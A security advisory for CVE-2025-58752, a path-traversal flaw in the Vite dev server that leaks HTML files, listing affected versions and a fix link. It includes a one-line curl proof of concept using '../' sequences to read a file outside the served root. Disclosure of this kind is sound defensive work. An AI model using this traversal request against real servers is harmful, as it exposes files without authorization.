---
description: CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak
title: Vite arbitrary remote HTML file leak
date_published: "2025-09-15"
last_updated: "2025-09-15"
xray_id:
vul_id: CVE-2025-58752
cvss: 7.5
severity: high
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

Vite arbitrary remote HTML file leak

## Component

[vite](https://www.npmjs.com/package/vite)

## Affected versions

\>=7.1.0,<=7.1.4

\>=7.0.0,<=7.0.6

\>=6.0.0,<=6.3.5

<=5.4.19

## Description

This vulnerability allows a remote attacker to leak any HTML file on the system.

## PoC

Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory

```shell
curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
```

## Vulnerability Mitigations

No mitigations are supplied for this vulnerability 



## References

[Fix PR](https://github.com/vitejs/vite/pull/20736)
